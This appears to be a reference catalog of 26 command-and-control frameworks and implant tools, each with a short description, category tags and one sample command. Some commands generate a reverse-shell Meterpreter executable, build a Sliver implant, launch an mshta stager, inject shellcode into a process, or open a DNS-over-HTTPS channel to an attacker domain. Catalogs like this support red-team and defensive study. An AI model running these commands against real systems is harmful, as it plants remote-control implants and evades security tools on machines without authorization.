# C2 Frameworks, RATs & Implants
> Source: HackTools | Entries: 26 | Platform: cross_platform


## Index

- [c2_framework](#c2framework)


### c2_framework

#### Ares
Python-based C2 framework with web-based management interface. Lightweight design with agents written in Python. Supp...
**Categories:** c2_framework, python, lightweight_c2, post_exploitation
```
python3 server.py
```

#### Brute Ratel C4
Commercial adversary simulation framework marketed as EDR-evasive. Uses 'Badger' implants with advanced evasion: indi...
**Categories:** c2_framework, adversary_simulation, red_team, edr_evasion
```
brc4 --generate-payload --listener https --format shellcode --arch x64
```

#### Cobalt Strike
Commercial adversary simulation platform widely abused by threat actors. Deploys 'beacon' implants that communicate v...
**Categories:** c2_framework, adversary_simulation, post_exploitation, red_team
```
execute-assembly /path/to/Seatbelt.exe -group=all
```

#### Covenant
.NET-based C2 framework with web interface. Uses 'Grunt' implants written in C#. Default listener on port 80/443. Web...
**Categories:** c2_framework, red_team, dotnet_implant, post_exploitation
```
dotnet run --project Covenant/Covenant.csproj --urls https://0.0.0.0:7443
```

#### DeimosC2
Go-based C2 framework with web UI supporting multiple agent types. Agents compiled for Windows, Linux, and macOS. Sup...
**Categories:** c2_framework, golang, red_team, post_exploitation
```
deimos --https --port 443 --host 0.0.0.0
```

#### Empire
PowerShell and Python post-exploitation framework (formerly PowerShell Empire, now with Starkiller GUI). Uses encrypt...
**Categories:** c2_framework, post_exploitation, powershell, red_team
```
python3 empire --rest --restport 1337
```

#### Faction
C2 framework built on .NET Core with modular agent and transport architecture. Uses RabbitMQ for internal message pas...
**Categories:** c2_framework, modular_c2, dotnet, plugin_architecture
```
dotnet Faction.exe
```

#### Godoh
DNS-over-HTTPS (DoH) C2 channel written in Go. Uses legitimate DoH providers (Google, Cloudflare) as communication ch...
**Categories:** c2_framework, dns_c2, doh, covert_channel
```
godoh --domain c2.attacker.com --provider google receive
```

#### Havoc
Modern open-source C2 framework with a 'Demon' agent. Written in C/C++ with a Qt-based GUI. Demon agent supports indi...
**Categories:** c2_framework, red_team, post_exploitation, adversary_simulation
```
demon spawn x64 smb --listener https_listener
```

#### Koadic
Windows post-exploitation framework using Windows Script Host (JScript/VBScript) as implant runtime. Called 'COM Comm...
**Categories:** c2_framework, post_exploitation, windows_script_host, com_abuse
```
use stager/js/mshta; set SRVHOST 10.0.0.1; run
```

#### MacC2
macOS-focused C2 framework with Python-based server and macOS-native implant. Targets macOS-specific post-exploitatio...
**Categories:** c2_framework, macos, post_exploitation, apple_security
```
python3 macc2_server.py
```

#### Merlin
Go-based C2 framework supporting HTTP/1.1, HTTP/2, and HTTP/3 (QUIC) protocols. Agents are compiled Go binaries (larg...
**Categories:** c2_framework, red_team, golang, post_exploitation
```
merlinServer-Linux-x64 -i 0.0.0.0 -p 443 -proto h2
```

#### Metasploit Framework
Open-source penetration testing framework with extensive exploit and payload library. Meterpreter payloads operate as...
**Categories:** c2_framework, exploit_framework, penetration_testing, post_exploitation
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe
```

#### Mythic
Modular C2 framework with web-based UI built on Docker microservices. Uses pluggable agents (Apollo, Poseidon, Medusa...
**Categories:** c2_framework, red_team, adversary_simulation, modular_c2
```
mythic-cli start
```

#### Nighthawk
Commercial C2 framework by MDSec with advanced evasion capabilities. Uses indirect syscalls, dynamic API resolution,...
**Categories:** c2_framework, adversary_simulation, edr_evasion, commercial_c2
```
nighthawk> inject-shellcode <pid> /path/to/shellcode.bin
```

#### Ninja C2
C2 framework focused on stealth operations with multiple evasion techniques. Supports HTTP/HTTPS/DNS C2 channels. Fea...
**Categories:** c2_framework, stealth, red_team, evasion
```
ninja_server --listener https --port 443 --domain c2.example.com
```

#### Nuages
Modular C2 framework with web UI built on Node.js/MongoDB backend. Uses REST API architecture. Supports multiple impl...
**Categories:** c2_framework, modular_c2, nodejs, rest_api
```
npm start
```

#### Octopus
C2 framework using Windows Script Host (cscript.exe/wscript.exe) for agent execution. Agents delivered as obfuscated...
**Categories:** c2_framework, windows_script_host, post_exploitation
```
python3 octopus.py
```

#### PoshC2
PowerShell/C#/Python-based C2 framework with proxy-aware communications. Default HTTPS listener on port 443. Implants...
**Categories:** c2_framework, red_team, powershell, post_exploitation
```
posh-server
```

#### Pyre
Python-based C2 framework focused on simplicity and cross-platform operation. Uses HTTP/HTTPS for agent communication...
**Categories:** c2_framework, python, lightweight_c2, cross_platform
```
python3 pyre_server.py --port 443 --ssl
```

#### SharpC2
.NET-based C2 framework using ASP.NET Core teamserver with C# implants. Implants use HTTP/HTTPS with customizable pro...
**Categories:** c2_framework, dotnet_implant, windows, red_team
```
dotnet SharpC2.API.dll
```

#### SILENTTRINITY
Post-exploitation C2 framework using IronPython and C# implants running on .NET CLR. Previously named 'ST'. Uses Boo...
**Categories:** c2_framework, post_exploitation, dotnet_implant, ironpython
```
python3 st.py teamserver --port 5000 <bind_ip> <password>
```

#### Silver
Go-based C2 framework (distinct from BishopFox Sliver). Lightweight C2 with HTTP/HTTPS agents. Agents compiled as Go...
**Categories:** c2_framework, golang, lightweight_c2, cross_platform
```
silver-server --port 443 --ssl
```

#### Sliver
Open-source cross-platform C2 framework written in Go by BishopFox. Generates implants as compiled Go binaries that a...
**Categories:** c2_framework, red_team, adversary_emulation, post_exploitation
```
generate --mtls 10.0.0.1:8888 --os windows --arch amd64 --format exe --save /tmp/implant.exe
```

#### TrevorC2
C2 framework that communicates through legitimate websites by embedding commands in browsable web pages. Client brows...
**Categories:** c2_framework, covert_channel, web_based_c2, traffic_evasion
```
python3 trevorc2_server.py
```

#### Villain
Lightweight C2 framework generating backdoors that bypass Windows Defender and other AV. Supports Windows (PowerShell...
**Categories:** c2_framework, reverse_shell, av_evasion, lightweight_c2
```
python3 Villain.py -p 8080
```
